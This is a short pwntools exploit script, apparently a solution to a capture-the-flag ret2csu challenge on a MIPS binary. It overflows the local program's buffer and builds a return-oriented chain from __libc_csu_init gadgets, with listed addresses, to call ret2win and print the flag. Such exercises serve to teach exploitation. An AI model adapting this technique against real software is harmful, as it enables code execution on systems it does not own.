from pwn import *

BINARY = "./ret2csu_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

p = process(BINARY)

"""
csu_init_gadget
-----------------------------------------------------------------------------
  4009a0:   lw  t9,0(s0)
  4009a4:   addiu  s1,s1,1
  4009a8:   move  a2,s5
  4009ac:   move  a1,s4
  4009b0:   jalr  t9
  4009b4:   move  a0,s3
  4009b8:   bne	 s2,s1,4009a0 <__libc_csu_init+0x60>
  4009bc:   addiu  s0,s0,4

pop_s012345_ra
-----------------------------------------------------------------------------
  4009c0:   lw  ra,52(sp)
  4009c4:   lw  s5,48(sp)
  4009c8:   lw	s4,44(sp)
  4009cc:   lw	s3,40(sp)
  4009d0:   lw	s2,36(sp)
  4009d4:   lw	s1,32(sp)
  4009d8:   lw	s0,28(sp)
  4009dc:   jr	ra
  4009e0:   addiu  sp,sp,56
"""

csu_init_gadget = p32(0x4009a0)
pop_s012345_ra  = p32(0x4009c0) 
jalr_ret2win    = p32(0x400904) # --> works with 0x400a60 <ret2win@plt>
ret2win_got     = p32(0x411058) # <ret2win@got>

rop = b"A" * 36

rop += pop_s012345_ra
rop += b'B' * 28
rop += ret2win_got # s0
rop += b'CCCC' # s1
rop += b'DDDD' # s2
rop += p32(0xdeadbeef) # s3
rop += p32(0xcafebabe) # s4
rop += p32(0xd00df00d) # s5

rop += csu_init_gadget # ra
rop += jalr_ret2win

log.success(f"ROP chain : {rop}")
p.sendline(rop)

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
